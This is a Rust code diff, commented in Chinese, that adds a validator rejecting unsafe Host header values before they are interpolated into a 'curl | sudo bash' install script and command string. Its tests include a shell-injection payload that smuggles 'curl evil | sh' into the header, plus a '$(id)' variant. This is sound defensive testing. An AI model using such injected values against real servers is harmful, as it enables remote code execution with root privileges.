@@ -47,6 +47,32 @@ pub fn safe_name(name: &str) -> bool {
     !name.is_empty() && !name.contains('/') && !name.contains('\\') && !name.contains("..")
 }
 
+/// `Host` 头只接受裸主机名（RFC 3986 的 reg-name 子集）加可选端口：`[A-Za-z0-9.-]+(:[0-9]{1,5})?`，
+/// 长度 < 256。不合形状一律当没给（回落期望态里的域名）：这个值会被写进下发的引导脚本
+/// 与 `/api/install-command` 的命令串，任何引号、`$`、`;` 都等于把 shell 注入交到 `sudo bash` 手里。
+pub fn safe_host(h: &str) -> bool {
+    if h.is_empty() || h.len() > 255 {
+        return false;
+    }
+    // 只切第一个冒号：`host:port:1` 的 `port:1` 落进端口段，非纯数字 ⇒ 拒
+    let (name, port) = match h.split_once(':') {
+        Some((n, p)) => (n, Some(p)),
+        None => (h, None),
+    };
+    if name.is_empty()
+        || !name
+            .bytes()
+            .all(|b| b.is_ascii_alphanumeric() || b == b'.' || b == b'-')
+    {
+        return false;
+    }
+    // IPv6 字面量（`[::1]:443`）也一并拒掉：面板走域名，VPS 没有 IPv6 出口
+    match port {
+        None => true,
+        Some(p) => !p.is_empty() && p.len() <= 5 && p.bytes().all(|b| b.is_ascii_digit()),
+    }
+}
+
 /// **同步**函数（`Fetcher` 是同步 trait，`reqwest::blocking` 不能在 async 上下文跑）：
 /// 只能在 `tokio::task::spawn_blocking` 里调用。
 ///
@@ -161,7 +187,7 @@ pub fn install_command(host: &str) -> String {
     )
 }
 
-/// 请求里的面板域名：`Host` 头，空则回落期望态里的域名。
+/// 请求里的面板域名：`Host` 头，空或不合 [`safe_host`] 的形状则回落期望态里的域名。
 ///
 /// `/api/install-command` 与 `/packages/bui-c-install.sh` 的占位符替换共用一处取法，
 /// 免得两边给出的面板地址对不上。
@@ -170,10 +196,10 @@ async fn request_host(app: &AppState, headers: &HeaderMap) -> String {
         .get(header::HOST)
         .and_then(|v| v.to_str().ok())
         .unwrap_or_default();
-    if host.is_empty() {
-        app.store.read().await.node.domain.clone()
-    } else {
+    if safe_host(host) {
         host.to_string()
+    } else {
+        app.store.read().await.node.domain.clone()
     }
 }
 
@@ -584,5 +610,58 @@ mod tests {
             get_with_host(&router, "/packages/bui-c-linux-amd64", "panel.example.com").await;
         assert_eq!(sb, axum::http::StatusCode::OK);
         assert_eq!(bb, PANEL_SOURCE_PLACEHOLDER.as_bytes(), "二进制被改动了");
+    }
+
+    /// 这个 Host 头会被写进下发给 `curl … | sudo bash` 的脚本与 `/api/install-command`
+    /// 的命令串，所以引号、`$`、`;` 都等于把 shell 注入交到 sudo 手里。
+    const HOSTILE_HOST: &str = r#"x.example.com"; curl evil | sh #"#;
+
+    #[test]
+    fn safe_host_accepts_hostnames_with_optional_port_and_rejects_shell_metacharacters() {
+        assert!(safe_host("panel.example.com"));
+        assert!(safe_host("panel.example.com:8443"));
+        assert!(safe_host("127.0.0.1"));
+        assert!(!safe_host(""));
+        assert!(!safe_host(r#"a"b"#));
+        assert!(!safe_host(HOSTILE_HOST));
+        assert!(!safe_host("$(id).example.com"));
+        assert!(!safe_host("a b"));
+        assert!(!safe_host("host:port:1"));
+        assert!(!safe_host("host:abc"));
+        assert!(!safe_host(&"a".repeat(256)), "长度要卡在 255 字节以内");
+    }
+
+    #[tokio::test]
+    async fn hostile_host_header_falls_back_to_the_configured_domain() {
+        let h = harness().await;
+        let domain = h.app.store.read().await.node.domain.clone();
+        let router = full_with(&h.app, axum::Router::new(), public_routes(h.shared.clone()));
+        let (s, _, bytes) =
+            get_with_host(&router, "/packages/bui-c-install.sh", HOSTILE_HOST).await;
+        assert_eq!(s, axum::http::StatusCode::OK);
+        let text = String::from_utf8(bytes).unwrap();
+        assert!(
+            !text.contains("evil"),
+            "恶意 Host 被原样写进了下发的引导脚本：{text}"
+        );
+        assert!(
+            text.contains(&format!(r#"PANEL_SOURCE="https://{domain}/packages""#)),
+            "不合形状的 Host 要回落期望态域名：{text}"
+        );
+    }
+
+    #[tokio::test]
+    async fn install_command_ignores_a_hostile_host_header() {
+        let h = harness().await;
+        let domain = h.app.store.read().await.node.domain.clone();
+        let router = mount(&h.app, public_routes(h.shared.clone()));
+        let (s, _, bytes) = get_with_host(&router, "/api/install-command", HOSTILE_HOST).await;
+        assert_eq!(s, axum::http::StatusCode::OK);
+        let v: serde_json::Value = serde_json::from_slice(&bytes).unwrap();
+        assert!(
+            !v["command"].as_str().unwrap().contains("evil"),
+            "恶意 Host 被拼进了 pipe-to-sudo 的命令串：{v}"
+        );
+        assert_eq!(v["server"], domain);
     }
 }
